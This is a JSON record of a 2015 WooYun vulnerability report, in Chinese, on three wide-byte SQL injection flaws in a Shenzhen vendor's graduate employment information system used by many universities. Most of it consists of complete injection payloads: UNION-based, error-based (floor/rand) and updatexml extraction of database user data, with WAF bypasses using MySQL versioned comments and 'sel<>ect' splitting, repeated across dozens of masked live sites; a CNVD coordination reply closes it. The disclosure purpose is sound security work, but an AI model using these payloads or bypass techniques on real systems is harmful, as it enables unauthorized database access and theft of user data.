{"id": 68117, "wybug_id": "wooyun-2015-0131838", "wybug_title": "汉码高校毕业生就业信息系统宽字节注入三处/绕过WAF", "wybug_corp": "深圳市汉码软件技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-07 14:52", "wybug_open_date": "2015-11-05 13:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向公众公开  简要描述： 3个宽字节，有点难度的注入，适合MYSQL大牛练手 详细说明：  其实我第一句想说这个系统的用户量的确是很大的。漏洞算起来也不是很多。厂商是：版权所有 深圳市汉码软件技术有限公司 我们来看看第一处注入：/file_download.php?search_keyword=&keyword_type=0&pg=7一般来看SQLMAP是注不出咯，扫描器也跑不出，经过收工测试是宽字节的注入，\n\n因为过滤了union和select，所以我们可以用/*!50000union*/、/*!50000select*/这样来绕过WAF\nhttp://**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0\n\n\n像这样的例子很多：\nhttp://**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0http://**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0http://**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0**.**.**.**/zs//file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0**.**.**.**:84/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0http://**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0**.**.**.**/file_download.php?search_keyword=%df%27%20/*!50000union*/%20/*!50000select*/%201,2,3,(/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),5,6,7%23&keyword_type=0\n第二处注入：/index_archives.php?search_keyword=1109059&search_type=1&actiontype=0  search_keyword参数也是存在宽字节注入\n\n还是用上门的方法来绕过WAF\nhttp://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0\n案例还是蛮多：\nhttp://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0**.**.**.**/zs/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0**.**.**.**:9280/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0http://**.**.**.**/index_archives.php?search_keyword=%df%27/*!50000and*/%20(/*!50000select*/%201%20/*!50000from*/%20%20(/*!50000select*/%20count(*),concat((/*!50000select*/%20concat(0x3a,user(),0x3a)%20/*!50000from*/%20school_user%20limit%200,1),floor(rand(0)*2))x%20/*!50000from*/%20%20information_schema.tables%20group%20by%20x)a)%23&search_type=0&actiontype=0\n第三处注入是POST的：/index_communicate.phpkeywords=1%df'&searchtype=0&Submit2=%CB%D1++%CB%F7\n\n这个可以用updatexml形式来注入，select可以使用sel<>lect来绕过。提交：keywords=1%df' a<>nd 1=(updatexml(1,concat(0x3a,(sel<>ect user())),1))%23&searchtype=0&Submit2=%CB%D1++%CB%F7  就可以注出user(),有些站点需要变动或者用其它方式注入，反正都是存在注入的\n\n存在漏洞的站点还是很多很多：\nhttp://**.**.**.**/index_communicate.php**.**.**.**:9280/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**//index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.php**.**.**.**:84/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.php**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.phphttp://**.**.**.**/index_communicate.php\n   漏洞证明：  已证明！   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-08-07 13:50 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}